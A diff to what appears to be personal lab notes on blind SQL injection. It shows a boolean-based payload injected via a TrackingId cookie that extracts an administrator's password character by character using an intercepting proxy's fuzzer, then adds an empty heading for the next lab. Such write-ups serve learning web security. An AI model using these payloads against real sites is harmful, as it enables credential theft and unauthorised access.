@@ -212,3 +212,9 @@ There exists a TrackingId cokie value when visiting the site.
 - Now send it to intruder and do this, fuzzing the a so we can find what the first letter of the password is `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
 - Now we just change the first integer in the password section like this: `' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§`
 - test these offsets until you get to the end of the password and you will have one
+
+### Blind SQL injection with conditional errors
+
+
+
+
